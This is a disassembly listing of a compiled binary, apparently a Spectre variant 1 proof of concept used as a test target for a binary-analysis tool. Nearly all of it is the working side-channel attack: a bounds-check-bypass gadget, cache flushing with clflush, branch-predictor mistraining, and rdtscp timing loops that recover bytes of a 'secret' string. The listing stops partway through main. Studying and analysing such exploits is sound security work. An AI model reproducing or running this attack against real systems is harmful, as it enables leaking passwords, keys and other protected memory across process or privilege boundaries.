
/root/src/TritonTest/spectre_test:     file format elf64-x86-64


Disassembly of section .init:

0000000000000630 <_init>:
 630:	48 83 ec 08          	sub    rsp,0x8
 634:	48 8b 05 ad 19 20 00 	mov    rax,QWORD PTR [rip+0x2019ad]        # 201fe8 <__gmon_start__>
 63b:	48 85 c0             	test   rax,rax
 63e:	74 02                	je     642 <_init+0x12>
 640:	ff d0                	call   rax
 642:	48 83 c4 08          	add    rsp,0x8
 646:	c3                   	ret    

Disassembly of section .plt:

0000000000000650 <.plt>:
 650:	ff 35 4a 19 20 00    	push   QWORD PTR [rip+0x20194a]        # 201fa0 <_GLOBAL_OFFSET_TABLE_+0x8>
 656:	ff 25 4c 19 20 00    	jmp    QWORD PTR [rip+0x20194c]        # 201fa8 <_GLOBAL_OFFSET_TABLE_+0x10>
 65c:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]

0000000000000660 <putchar@plt>:
 660:	ff 25 4a 19 20 00    	jmp    QWORD PTR [rip+0x20194a]        # 201fb0 <putchar@GLIBC_2.2.5>
 666:	68 00 00 00 00       	push   0x0
 66b:	e9 e0 ff ff ff       	jmp    650 <.plt>

0000000000000670 <strlen@plt>:
 670:	ff 25 42 19 20 00    	jmp    QWORD PTR [rip+0x201942]        # 201fb8 <strlen@GLIBC_2.2.5>
 676:	68 01 00 00 00       	push   0x1
 67b:	e9 d0 ff ff ff       	jmp    650 <.plt>

0000000000000680 <__stack_chk_fail@plt>:
 680:	ff 25 3a 19 20 00    	jmp    QWORD PTR [rip+0x20193a]        # 201fc0 <__stack_chk_fail@GLIBC_2.4>
 686:	68 02 00 00 00       	push   0x2
 68b:	e9 c0 ff ff ff       	jmp    650 <.plt>

0000000000000690 <printf@plt>:
 690:	ff 25 32 19 20 00    	jmp    QWORD PTR [rip+0x201932]        # 201fc8 <printf@GLIBC_2.2.5>
 696:	68 03 00 00 00       	push   0x3
 69b:	e9 b0 ff ff ff       	jmp    650 <.plt>

00000000000006a0 <__isoc99_sscanf@plt>:
 6a0:	ff 25 2a 19 20 00    	jmp    QWORD PTR [rip+0x20192a]        # 201fd0 <__isoc99_sscanf@GLIBC_2.7>
 6a6:	68 04 00 00 00       	push   0x4
 6ab:	e9 a0 ff ff ff       	jmp    650 <.plt>

Disassembly of section .plt.got:

00000000000006b0 <__cxa_finalize@plt>:
 6b0:	ff 25 42 19 20 00    	jmp    QWORD PTR [rip+0x201942]        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 6b6:	66 90                	xchg   ax,ax

Disassembly of section .text:

00000000000006c0 <_start>:
 6c0:	31 ed                	xor    ebp,ebp
 6c2:	49 89 d1             	mov    r9,rdx
 6c5:	5e                   	pop    rsi
 6c6:	48 89 e2             	mov    rdx,rsp
 6c9:	48 83 e4 f0          	and    rsp,0xfffffffffffffff0
 6cd:	50                   	push   rax
 6ce:	54                   	push   rsp
 6cf:	4c 8d 05 fa 07 00 00 	lea    r8,[rip+0x7fa]        # ed0 <__libc_csu_fini>
 6d6:	48 8d 0d 83 07 00 00 	lea    rcx,[rip+0x783]        # e60 <__libc_csu_init>
 6dd:	48 8d 3d 27 05 00 00 	lea    rdi,[rip+0x527]        # c0b <main>
 6e4:	ff 15 f6 18 20 00    	call   QWORD PTR [rip+0x2018f6]        # 201fe0 <__libc_start_main@GLIBC_2.2.5>
 6ea:	f4                   	hlt    
 6eb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000006f0 <deregister_tm_clones>:
 6f0:	48 8d 3d f1 19 20 00 	lea    rdi,[rip+0x2019f1]        # 2020e8 <__TMC_END__>
 6f7:	55                   	push   rbp
 6f8:	48 8d 05 e9 19 20 00 	lea    rax,[rip+0x2019e9]        # 2020e8 <__TMC_END__>
 6ff:	48 39 f8             	cmp    rax,rdi
 702:	48 89 e5             	mov    rbp,rsp
 705:	74 19                	je     720 <deregister_tm_clones+0x30>
 707:	48 8b 05 ca 18 20 00 	mov    rax,QWORD PTR [rip+0x2018ca]        # 201fd8 <_ITM_deregisterTMCloneTable>
 70e:	48 85 c0             	test   rax,rax
 711:	74 0d                	je     720 <deregister_tm_clones+0x30>
 713:	5d                   	pop    rbp
 714:	ff e0                	jmp    rax
 716:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]
 71d:	00 00 00 
 720:	5d                   	pop    rbp
 721:	c3                   	ret    
 722:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
 726:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]
 72d:	00 00 00 

0000000000000730 <register_tm_clones>:
 730:	48 8d 3d b1 19 20 00 	lea    rdi,[rip+0x2019b1]        # 2020e8 <__TMC_END__>
 737:	48 8d 35 aa 19 20 00 	lea    rsi,[rip+0x2019aa]        # 2020e8 <__TMC_END__>
 73e:	55                   	push   rbp
 73f:	48 29 fe             	sub    rsi,rdi
 742:	48 89 e5             	mov    rbp,rsp
 745:	48 c1 fe 03          	sar    rsi,0x3
 749:	48 89 f0             	mov    rax,rsi
 74c:	48 c1 e8 3f          	shr    rax,0x3f
 750:	48 01 c6             	add    rsi,rax
 753:	48 d1 fe             	sar    rsi,1
 756:	74 18                	je     770 <register_tm_clones+0x40>
 758:	48 8b 05 91 18 20 00 	mov    rax,QWORD PTR [rip+0x201891]        # 201ff0 <_ITM_registerTMCloneTable>
 75f:	48 85 c0             	test   rax,rax
 762:	74 0c                	je     770 <register_tm_clones+0x40>
 764:	5d                   	pop    rbp
 765:	ff e0                	jmp    rax
 767:	66 0f 1f 84 00 00 00 	nop    WORD PTR [rax+rax*1+0x0]
 76e:	00 00 
 770:	5d                   	pop    rbp
 771:	c3                   	ret    
 772:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
 776:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]
 77d:	00 00 00 

0000000000000780 <__do_global_dtors_aux>:
 780:	80 3d 79 19 20 00 00 	cmp    BYTE PTR [rip+0x201979],0x0        # 202100 <completed.7698>
 787:	75 2f                	jne    7b8 <__do_global_dtors_aux+0x38>
 789:	48 83 3d 67 18 20 00 	cmp    QWORD PTR [rip+0x201867],0x0        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 790:	00 
 791:	55                   	push   rbp
 792:	48 89 e5             	mov    rbp,rsp
 795:	74 0c                	je     7a3 <__do_global_dtors_aux+0x23>
 797:	48 8b 3d 6a 18 20 00 	mov    rdi,QWORD PTR [rip+0x20186a]        # 202008 <__dso_handle>
 79e:	e8 0d ff ff ff       	call   6b0 <__cxa_finalize@plt>
 7a3:	e8 48 ff ff ff       	call   6f0 <deregister_tm_clones>
 7a8:	c6 05 51 19 20 00 01 	mov    BYTE PTR [rip+0x201951],0x1        # 202100 <completed.7698>
 7af:	5d                   	pop    rbp
 7b0:	c3                   	ret    
 7b1:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]
 7b8:	f3 c3                	repz ret 
 7ba:	66 0f 1f 44 00 00    	nop    WORD PTR [rax+rax*1+0x0]

00000000000007c0 <frame_dummy>:
 7c0:	55                   	push   rbp
 7c1:	48 89 e5             	mov    rbp,rsp
 7c4:	5d                   	pop    rbp
 7c5:	e9 66 ff ff ff       	jmp    730 <register_tm_clones>

00000000000007ca <spectre_function>:
 7ca:	55                   	push   rbp
 7cb:	48 89 e5             	mov    rbp,rsp
 7ce:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
 7d2:	8b 05 48 18 20 00    	mov    eax,DWORD PTR [rip+0x201848]        # 202020 <array1_size>
 7d8:	89 c0                	mov    eax,eax
 7da:	48 39 45 f8          	cmp    QWORD PTR [rbp-0x8],rax
 7de:	73 34                	jae    814 <spectre_function+0x4a>
 7e0:	48 8d 15 59 18 20 00 	lea    rdx,[rip+0x201859]        # 202040 <array1>
 7e7:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
 7eb:	48 01 d0             	add    rax,rdx
 7ee:	0f b6 00             	movzx  eax,BYTE PTR [rax]
 7f1:	0f b6 c0             	movzx  eax,al
 7f4:	c1 e0 09             	shl    eax,0x9
 7f7:	48 63 d0             	movsxd rdx,eax
 7fa:	48 8d 05 7f 1d 20 00 	lea    rax,[rip+0x201d7f]        # 202580 <array2>
 801:	0f b6 14 02          	movzx  edx,BYTE PTR [rdx+rax*1]
 805:	0f b6 05 14 19 20 00 	movzx  eax,BYTE PTR [rip+0x201914]        # 202120 <temp>
 80c:	21 d0                	and    eax,edx
 80e:	88 05 0c 19 20 00    	mov    BYTE PTR [rip+0x20190c],al        # 202120 <temp>
 814:	90                   	nop
 815:	5d                   	pop    rbp
 816:	c3                   	ret    

0000000000000817 <readMemoryByte>:
 817:	55                   	push   rbp
 818:	48 89 e5             	mov    rbp,rsp
 81b:	53                   	push   rbx
 81c:	48 81 ec 88 00 00 00 	sub    rsp,0x88
 823:	48 89 7d 88          	mov    QWORD PTR [rbp-0x78],rdi
 827:	48 89 75 80          	mov    QWORD PTR [rbp-0x80],rsi
 82b:	48 89 95 78 ff ff ff 	mov    QWORD PTR [rbp-0x88],rdx
 832:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
 839:	00 00 
 83b:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
 83f:	31 c0                	xor    eax,eax
 841:	c7 45 94 00 00 00 00 	mov    DWORD PTR [rbp-0x6c],0x0
 848:	c7 45 a0 00 00 00 00 	mov    DWORD PTR [rbp-0x60],0x0
 84f:	eb 1f                	jmp    870 <readMemoryByte+0x59>
 851:	8b 45 a0             	mov    eax,DWORD PTR [rbp-0x60]
 854:	48 98                	cdqe   
 856:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
 85d:	00 
 85e:	48 8d 05 db 18 20 00 	lea    rax,[rip+0x2018db]        # 202140 <results.23638>
 865:	c7 04 02 00 00 00 00 	mov    DWORD PTR [rdx+rax*1],0x0
 86c:	83 45 a0 01          	add    DWORD PTR [rbp-0x60],0x1
 870:	83 7d a0 01          	cmp    DWORD PTR [rbp-0x60],0x1
 874:	7e db                	jle    851 <readMemoryByte+0x3a>
 876:	c7 45 9c 02 00 00 00 	mov    DWORD PTR [rbp-0x64],0x2
 87d:	e9 f1 02 00 00       	jmp    b73 <readMemoryByte+0x35c>
 882:	c7 45 a0 00 00 00 00 	mov    DWORD PTR [rbp-0x60],0x0
 889:	eb 22                	jmp    8ad <readMemoryByte+0x96>
 88b:	8b 45 a0             	mov    eax,DWORD PTR [rbp-0x60]
 88e:	c1 e0 09             	shl    eax,0x9
 891:	48 63 d0             	movsxd rdx,eax
 894:	48 8d 05 e5 1c 20 00 	lea    rax,[rip+0x201ce5]        # 202580 <array2>
 89b:	48 01 d0             	add    rax,rdx
 89e:	48 89 45 c8          	mov    QWORD PTR [rbp-0x38],rax
 8a2:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
 8a6:	0f ae 38             	clflush BYTE PTR [rax]
 8a9:	83 45 a0 01          	add    DWORD PTR [rbp-0x60],0x1
 8ad:	83 7d a0 01          	cmp    DWORD PTR [rbp-0x60],0x1
 8b1:	7e d8                	jle    88b <readMemoryByte+0x74>
 8b3:	8b 45 9c             	mov    eax,DWORD PTR [rbp-0x64]
 8b6:	8b 0d 64 17 20 00    	mov    ecx,DWORD PTR [rip+0x201764]        # 202020 <array1_size>
 8bc:	ba 00 00 00 00       	mov    edx,0x0
 8c1:	f7 f1                	div    ecx
 8c3:	89 d0                	mov    eax,edx
 8c5:	89 c0                	mov    eax,eax
 8c7:	48 89 45 b0          	mov    QWORD PTR [rbp-0x50],rax
 8cb:	c7 45 a4 02 00 00 00 	mov    DWORD PTR [rbp-0x5c],0x2
 8d2:	e9 88 00 00 00       	jmp    95f <readMemoryByte+0x148>
 8d7:	48 8d 05 42 17 20 00 	lea    rax,[rip+0x201742]        # 202020 <array1_size>
 8de:	48 89 45 d0          	mov    QWORD PTR [rbp-0x30],rax
 8e2:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
 8e6:	0f ae 38             	clflush BYTE PTR [rax]
 8e9:	c7 45 98 00 00 00 00 	mov    DWORD PTR [rbp-0x68],0x0
 8f0:	eb 09                	jmp    8fb <readMemoryByte+0xe4>
 8f2:	8b 45 98             	mov    eax,DWORD PTR [rbp-0x68]
 8f5:	83 c0 01             	add    eax,0x1
 8f8:	89 45 98             	mov    DWORD PTR [rbp-0x68],eax
 8fb:	8b 45 98             	mov    eax,DWORD PTR [rbp-0x68]
 8fe:	83 f8 01             	cmp    eax,0x1
 901:	7e ef                	jle    8f2 <readMemoryByte+0xdb>
 903:	8b 4d a4             	mov    ecx,DWORD PTR [rbp-0x5c]
 906:	ba ab aa aa 2a       	mov    edx,0x2aaaaaab
 90b:	89 c8                	mov    eax,ecx
 90d:	f7 ea                	imul   edx
 90f:	89 c8                	mov    eax,ecx
 911:	c1 f8 1f             	sar    eax,0x1f
 914:	29 c2                	sub    edx,eax
 916:	89 d0                	mov    eax,edx
 918:	01 c0                	add    eax,eax
 91a:	01 d0                	add    eax,edx
 91c:	01 c0                	add    eax,eax
 91e:	29 c1                	sub    ecx,eax
 920:	89 ca                	mov    edx,ecx
 922:	8d 42 ff             	lea    eax,[rdx-0x1]
 925:	66 b8 00 00          	mov    ax,0x0
 929:	48 98                	cdqe   
 92b:	48 89 45 c0          	mov    QWORD PTR [rbp-0x40],rax
 92f:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
 933:	48 c1 e8 10          	shr    rax,0x10
 937:	48 09 45 c0          	or     QWORD PTR [rbp-0x40],rax
 93b:	48 8b 45 88          	mov    rax,QWORD PTR [rbp-0x78]
 93f:	48 33 45 b0          	xor    rax,QWORD PTR [rbp-0x50]
 943:	48 23 45 c0          	and    rax,QWORD PTR [rbp-0x40]
 947:	48 33 45 b0          	xor    rax,QWORD PTR [rbp-0x50]
 94b:	48 89 45 c0          	mov    QWORD PTR [rbp-0x40],rax
 94f:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
 953:	48 89 c7             	mov    rdi,rax
 956:	e8 6f fe ff ff       	call   7ca <spectre_function>
 95b:	83 6d a4 01          	sub    DWORD PTR [rbp-0x5c],0x1
 95f:	83 7d a4 00          	cmp    DWORD PTR [rbp-0x5c],0x0
 963:	0f 89 6e ff ff ff    	jns    8d7 <readMemoryByte+0xc0>
 969:	c7 45 a0 00 00 00 00 	mov    DWORD PTR [rbp-0x60],0x0
 970:	e9 d7 00 00 00       	jmp    a4c <readMemoryByte+0x235>
 975:	8b 45 a0             	mov    eax,DWORD PTR [rbp-0x60]
 978:	69 c0 a7 00 00 00    	imul   eax,eax,0xa7
 97e:	83 c0 0d             	add    eax,0xd
 981:	25 ff 00 00 00       	and    eax,0xff
 986:	89 45 ac             	mov    DWORD PTR [rbp-0x54],eax
 989:	8b 45 ac             	mov    eax,DWORD PTR [rbp-0x54]
 98c:	c1 e0 09             	shl    eax,0x9
 98f:	48 63 d0             	movsxd rdx,eax
 992:	48 8d 05 e7 1b 20 00 	lea    rax,[rip+0x201be7]        # 202580 <array2>
 999:	48 01 d0             	add    rax,rdx
 99c:	48 89 45 b8          	mov    QWORD PTR [rbp-0x48],rax
 9a0:	48 8d 45 94          	lea    rax,[rbp-0x6c]
 9a4:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
 9a8:	0f 01 f9             	rdtscp 
 9ab:	89 ce                	mov    esi,ecx
 9ad:	48 8b 4d e0          	mov    rcx,QWORD PTR [rbp-0x20]
 9b1:	89 31                	mov    DWORD PTR [rcx],esi
 9b3:	48 c1 e2 20          	shl    rdx,0x20
 9b7:	48 09 d0             	or     rax,rdx
 9ba:	48 89 c3             	mov    rbx,rax
 9bd:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
 9c1:	0f b6 00             	movzx  eax,BYTE PTR [rax]
 9c4:	0f b6 c0             	movzx  eax,al
 9c7:	89 45 94             	mov    DWORD PTR [rbp-0x6c],eax
 9ca:	48 8d 45 94          	lea    rax,[rbp-0x6c]
 9ce:	48 89 45 d8          	mov    QWORD PTR [rbp-0x28],rax
 9d2:	0f 01 f9             	rdtscp 
 9d5:	89 ce                	mov    esi,ecx
 9d7:	48 8b 4d d8          	mov    rcx,QWORD PTR [rbp-0x28]
 9db:	89 31                	mov    DWORD PTR [rcx],esi
 9dd:	48 c1 e2 20          	shl    rdx,0x20
 9e1:	48 09 d0             	or     rax,rdx
 9e4:	48 29 d8             	sub    rax,rbx
 9e7:	48 89 c3             	mov    rbx,rax
 9ea:	48 83 fb 50          	cmp    rbx,0x50
 9ee:	77 58                	ja     a48 <readMemoryByte+0x231>
 9f0:	8b 45 9c             	mov    eax,DWORD PTR [rbp-0x64]
 9f3:	8b 0d 27 16 20 00    	mov    ecx,DWORD PTR [rip+0x201627]        # 202020 <array1_size>
 9f9:	ba 00 00 00 00       	mov    edx,0x0
 9fe:	f7 f1                	div    ecx
 a00:	89 d0                	mov    eax,edx
 a02:	89 c2                	mov    edx,eax
 a04:	48 8d 05 35 16 20 00 	lea    rax,[rip+0x201635]        # 202040 <array1>
 a0b:	0f b6 04 02          	movzx  eax,BYTE PTR [rdx+rax*1]
 a0f:	0f b6 c0             	movzx  eax,al
 a12:	39 45 ac             	cmp    DWORD PTR [rbp-0x54],eax
 a15:	74 31                	je     a48 <readMemoryByte+0x231>
 a17:	8b 45 ac             	mov    eax,DWORD PTR [rbp-0x54]
 a1a:	48 98                	cdqe   
 a1c:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
 a23:	00 
 a24:	48 8d 05 15 17 20 00 	lea    rax,[rip+0x201715]        # 202140 <results.23638>
 a2b:	8b 04 02             	mov    eax,DWORD PTR [rdx+rax*1]
 a2e:	8d 48 01             	lea    ecx,[rax+0x1]
 a31:	8b 45 ac             	mov    eax,DWORD PTR [rbp-0x54]
 a34:	48 98                	cdqe   
 a36:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
 a3d:	00 
 a3e:	48 8d 05 fb 16 20 00 	lea    rax,[rip+0x2016fb]        # 202140 <results.23638>
 a45:	89 0c 02             	mov    DWORD PTR [rdx+rax*1],ecx
 a48:	83 45 a0 01          	add    DWORD PTR [rbp-0x60],0x1
 a4c:	83 7d a0 01          	cmp    DWORD PTR [rbp-0x60],0x1
 a50:	0f 8e 1f ff ff ff    	jle    975 <readMemoryByte+0x15e>
 a56:	c7 45 a8 ff ff ff ff 	mov    DWORD PTR [rbp-0x58],0xffffffff
 a5d:	8b 45 a8             	mov    eax,DWORD PTR [rbp-0x58]
 a60:	89 45 a4             	mov    DWORD PTR [rbp-0x5c],eax
 a63:	c7 45 a0 00 00 00 00 	mov    DWORD PTR [rbp-0x60],0x0
 a6a:	e9 88 00 00 00       	jmp    af7 <readMemoryByte+0x2e0>
 a6f:	83 7d a4 00          	cmp    DWORD PTR [rbp-0x5c],0x0
 a73:	78 32                	js     aa7 <readMemoryByte+0x290>
 a75:	8b 45 a0             	mov    eax,DWORD PTR [rbp-0x60]
 a78:	48 98                	cdqe   
 a7a:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
 a81:	00 
 a82:	48 8d 05 b7 16 20 00 	lea    rax,[rip+0x2016b7]        # 202140 <results.23638>
 a89:	8b 14 02             	mov    edx,DWORD PTR [rdx+rax*1]
 a8c:	8b 45 a4             	mov    eax,DWORD PTR [rbp-0x5c]
 a8f:	48 98                	cdqe   
 a91:	48 8d 0c 85 00 00 00 	lea    rcx,[rax*4+0x0]
 a98:	00 
 a99:	48 8d 05 a0 16 20 00 	lea    rax,[rip+0x2016a0]        # 202140 <results.23638>
 aa0:	8b 04 01             	mov    eax,DWORD PTR [rcx+rax*1]
 aa3:	39 c2                	cmp    edx,eax
 aa5:	7c 0e                	jl     ab5 <readMemoryByte+0x29e>
 aa7:	8b 45 a4             	mov    eax,DWORD PTR [rbp-0x5c]
 aaa:	89 45 a8             	mov    DWORD PTR [rbp-0x58],eax
 aad:	8b 45 a0             	mov    eax,DWORD PTR [rbp-0x60]
 ab0:	89 45 a4             	mov    DWORD PTR [rbp-0x5c],eax
 ab3:	eb 3e                	jmp    af3 <readMemoryByte+0x2dc>
 ab5:	83 7d a8 00          	cmp    DWORD PTR [rbp-0x58],0x0
 ab9:	78 32                	js     aed <readMemoryByte+0x2d6>
 abb:	8b 45 a0             	mov    eax,DWORD PTR [rbp-0x60]
 abe:	48 98                	cdqe   
 ac0:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
 ac7:	00 
 ac8:	48 8d 05 71 16 20 00 	lea    rax,[rip+0x201671]        # 202140 <results.23638>
 acf:	8b 14 02             	mov    edx,DWORD PTR [rdx+rax*1]
 ad2:	8b 45 a8             	mov    eax,DWORD PTR [rbp-0x58]
 ad5:	48 98                	cdqe   
 ad7:	48 8d 0c 85 00 00 00 	lea    rcx,[rax*4+0x0]
 ade:	00 
 adf:	48 8d 05 5a 16 20 00 	lea    rax,[rip+0x20165a]        # 202140 <results.23638>
 ae6:	8b 04 01             	mov    eax,DWORD PTR [rcx+rax*1]
 ae9:	39 c2                	cmp    edx,eax
 aeb:	7c 06                	jl     af3 <readMemoryByte+0x2dc>
 aed:	8b 45 a0             	mov    eax,DWORD PTR [rbp-0x60]
 af0:	89 45 a8             	mov    DWORD PTR [rbp-0x58],eax
 af3:	83 45 a0 01          	add    DWORD PTR [rbp-0x60],0x1
 af7:	83 7d a0 01          	cmp    DWORD PTR [rbp-0x60],0x1
 afb:	0f 8e 6e ff ff ff    	jle    a6f <readMemoryByte+0x258>
 b01:	8b 45 a4             	mov    eax,DWORD PTR [rbp-0x5c]
 b04:	48 98                	cdqe   
 b06:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
 b0d:	00 
 b0e:	48 8d 05 2b 16 20 00 	lea    rax,[rip+0x20162b]        # 202140 <results.23638>
 b15:	8b 14 02             	mov    edx,DWORD PTR [rdx+rax*1]
 b18:	8b 45 a8             	mov    eax,DWORD PTR [rbp-0x58]
 b1b:	48 98                	cdqe   
 b1d:	48 8d 0c 85 00 00 00 	lea    rcx,[rax*4+0x0]
 b24:	00 
 b25:	48 8d 05 14 16 20 00 	lea    rax,[rip+0x201614]        # 202140 <results.23638>
 b2c:	8b 04 01             	mov    eax,DWORD PTR [rcx+rax*1]
 b2f:	01 c0                	add    eax,eax
 b31:	83 c0 05             	add    eax,0x5
 b34:	39 c2                	cmp    edx,eax
 b36:	7d 45                	jge    b7d <readMemoryByte+0x366>
 b38:	8b 45 a4             	mov    eax,DWORD PTR [rbp-0x5c]
 b3b:	48 98                	cdqe   
 b3d:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
 b44:	00 
 b45:	48 8d 05 f4 15 20 00 	lea    rax,[rip+0x2015f4]        # 202140 <results.23638>
 b4c:	8b 04 02             	mov    eax,DWORD PTR [rdx+rax*1]
 b4f:	83 f8 02             	cmp    eax,0x2
 b52:	75 1b                	jne    b6f <readMemoryByte+0x358>
 b54:	8b 45 a8             	mov    eax,DWORD PTR [rbp-0x58]
 b57:	48 98                	cdqe   
 b59:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
 b60:	00 
 b61:	48 8d 05 d8 15 20 00 	lea    rax,[rip+0x2015d8]        # 202140 <results.23638>
 b68:	8b 04 02             	mov    eax,DWORD PTR [rdx+rax*1]
 b6b:	85 c0                	test   eax,eax
 b6d:	74 0e                	je     b7d <readMemoryByte+0x366>
 b6f:	83 6d 9c 01          	sub    DWORD PTR [rbp-0x64],0x1
 b73:	83 7d 9c 00          	cmp    DWORD PTR [rbp-0x64],0x0
 b77:	0f 8f 05 fd ff ff    	jg     882 <readMemoryByte+0x6b>
 b7d:	8b 05 bd 15 20 00    	mov    eax,DWORD PTR [rip+0x2015bd]        # 202140 <results.23638>
 b83:	89 c2                	mov    edx,eax
 b85:	8b 45 94             	mov    eax,DWORD PTR [rbp-0x6c]
 b88:	31 d0                	xor    eax,edx
 b8a:	89 05 b0 15 20 00    	mov    DWORD PTR [rip+0x2015b0],eax        # 202140 <results.23638>
 b90:	8b 45 a4             	mov    eax,DWORD PTR [rbp-0x5c]
 b93:	89 c2                	mov    edx,eax
 b95:	48 8b 45 80          	mov    rax,QWORD PTR [rbp-0x80]
 b99:	88 10                	mov    BYTE PTR [rax],dl
 b9b:	8b 45 a4             	mov    eax,DWORD PTR [rbp-0x5c]
 b9e:	48 98                	cdqe   
 ba0:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
 ba7:	00 
 ba8:	48 8d 05 91 15 20 00 	lea    rax,[rip+0x201591]        # 202140 <results.23638>
 baf:	8b 14 02             	mov    edx,DWORD PTR [rdx+rax*1]
 bb2:	48 8b 85 78 ff ff ff 	mov    rax,QWORD PTR [rbp-0x88]
 bb9:	89 10                	mov    DWORD PTR [rax],edx
 bbb:	48 8b 45 80          	mov    rax,QWORD PTR [rbp-0x80]
 bbf:	48 83 c0 01          	add    rax,0x1
 bc3:	8b 55 a8             	mov    edx,DWORD PTR [rbp-0x58]
 bc6:	88 10                	mov    BYTE PTR [rax],dl
 bc8:	48 8b 85 78 ff ff ff 	mov    rax,QWORD PTR [rbp-0x88]
 bcf:	48 8d 50 04          	lea    rdx,[rax+0x4]
 bd3:	8b 45 a8             	mov    eax,DWORD PTR [rbp-0x58]
 bd6:	48 98                	cdqe   
 bd8:	48 8d 0c 85 00 00 00 	lea    rcx,[rax*4+0x0]
 bdf:	00 
 be0:	48 8d 05 59 15 20 00 	lea    rax,[rip+0x201559]        # 202140 <results.23638>
 be7:	8b 04 01             	mov    eax,DWORD PTR [rcx+rax*1]
 bea:	89 02                	mov    DWORD PTR [rdx],eax
 bec:	90                   	nop
 bed:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
 bf1:	64 48 33 04 25 28 00 	xor    rax,QWORD PTR fs:0x28
 bf8:	00 00 
 bfa:	74 05                	je     c01 <readMemoryByte+0x3ea>
 bfc:	e8 7f fa ff ff       	call   680 <__stack_chk_fail@plt>
 c01:	48 81 c4 88 00 00 00 	add    rsp,0x88
 c08:	5b                   	pop    rbx
 c09:	5d                   	pop    rbp
 c0a:	c3                   	ret    

0000000000000c0b <main>:
 c0b:	55                   	push   rbp
 c0c:	48 89 e5             	mov    rbp,rsp
 c0f:	48 83 ec 50          	sub    rsp,0x50
 c13:	89 7d bc             	mov    DWORD PTR [rbp-0x44],edi
 c16:	48 89 75 b0          	mov    QWORD PTR [rbp-0x50],rsi
 c1a:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
 c21:	00 00 
 c23:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
 c27:	31 c0                	xor    eax,eax
 c29:	48 8b 05 b0 14 20 00 	mov    rax,QWORD PTR [rip+0x2014b0]        # 2020e0 <secret>
 c30:	48 89 c2             	mov    rdx,rax
 c33:	48 8d 05 06 14 20 00 	lea    rax,[rip+0x201406]        # 202040 <array1>
 c3a:	48 29 c2             	sub    rdx,rax
 c3d:	48 89 d0             	mov    rax,rdx
 c40:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
 c44:	48 8b 05 95 14 20 00 	mov    rax,QWORD PTR [rip+0x201495]        # 2020e0 <secret>
 c4b:	48 89 c7             	mov    rdi,rax
 c4e:	e8 1d fa ff ff       	call   670 <strlen@plt>
 c53:	89 45 cc             	mov    DWORD PTR [rbp-0x34],eax
 c56:	c7 45 d4 00 00 00 00 	mov    DWORD PTR [rbp-0x2c],0x0
 c5d:	c7 45 d8 00 00 00 00 	mov    DWORD PTR [rbp-0x28],0x0
 c64:	c7 45 dc 00 00 00 00 	mov    DWORD PTR [rbp-0x24],0x0
 c6b:	c7 45 d0 00 00 00 00 	mov    DWORD PTR [rbp-0x30],0x0
 c72:	eb 15                	jmp    c89 <main+0x7e>
 c74:	8b 45 d0             	mov    eax,DWORD PTR [rbp-0x30]
 c77:	48 63 d0             	movsxd rdx,eax
 c7a:	48 8d 05 ff 18 20 00 	lea    rax,[rip+0x2018ff]        # 202580 <array2>
 c81:	c6 04 02 01          	mov    BYTE PTR [rdx+rax*1],0x1
 c85:	83 45 d0 01          	add    DWORD PTR [rbp-0x30],0x1
 c89:	83 7d d0 01          	cmp    DWORD PTR [rbp-0x30],0x1
 c8d:	7e e5                	jle    c74 <main+0x69>
 c8f:	83 7d bc 03          	cmp    DWORD PTR [rbp-0x44],0x3
 c93:	75 5b                	jne    cf0 <main+0xe5>
 c95:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
 c99:	48 83 c0 08          	add    rax,0x8
 c9d:	48 8b 00             	mov    rax,QWORD PTR [rax]
 ca0:	48 8d 55 e0          	lea    rdx,[rbp-0x20]
 ca4:	48 8d 35 4d 02 00 00 	lea    rsi,[rip+0x24d]        # ef8 <_IO_stdin_used+0x18>
 cab:	48 89 c7             	mov    rdi,rax
 cae:	b8 00 00 00 00       	mov    eax,0x0
 cb3:	e8 e8 f9 ff ff       	call   6a0 <__isoc99_sscanf@plt>
 cb8:	48 8b 55 e0          	mov    rdx,QWORD PTR [rbp-0x20]
 cbc:	48 8d 05 7d 13 20 00 	lea    rax,[rip+0x20137d]        # 202040 <array1>
 cc3:	48 29 c2             	sub    rdx,rax
 cc6:	48 89 d0             	mov    rax,rdx
 cc9:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
 ccd:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
 cd1:	48 83 c0 10          	add    rax,0x10
 cd5:	48 8b 00             	mov    rax,QWORD PTR [rax]
